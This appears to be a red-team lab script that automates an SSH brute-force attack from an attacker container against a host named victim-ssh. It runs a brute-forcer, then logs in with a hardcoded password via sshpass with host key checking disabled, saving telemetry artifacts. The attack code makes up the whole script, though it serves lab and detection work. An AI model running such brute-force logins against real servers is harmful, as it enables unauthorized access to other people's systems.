#!/bin/bash
set -Eeuo pipefail

show_help() {
    cat <<'USAGE'
Usage: run.sh

Automates the SSH bruteforce scenario from the attacker container.
Steps performed:
  1. Generate a credential wordlist tailored to the victim.
  2. Launch the Python bruteforcer against victim-ssh.
  3. Log successful authentication and capture commands for post-exploitation.
USAGE
}

if [[ ${1:-} == "--help" || ${1:-} == "-h" ]]; then
    show_help
    exit 0
fi

OUTPUT_DIR="/opt/telemetry/redteam/01-ssh-bruteforce"
mkdir -p "$OUTPUT_DIR"

python3 /opt/redteam/tools/brute_ssh.py \
    --host victim-ssh \
    --port 22 \
    --username victim \
    --wordlist "$OUTPUT_DIR/wordlist.txt" \
    --max-workers 4 \
    --timeout 5 \
    --log "$OUTPUT_DIR/bruteforce.log"

if [[ -f "$OUTPUT_DIR/session.txt" ]]; then
    echo "Session already recorded."
else
    sshpass -p "WeakPass123!" ssh -o StrictHostKeyChecking=no victim@victim-ssh 'hostname && whoami' > "$OUTPUT_DIR/session.txt"
fi

echo "Scenario complete. Review $OUTPUT_DIR for artifacts."
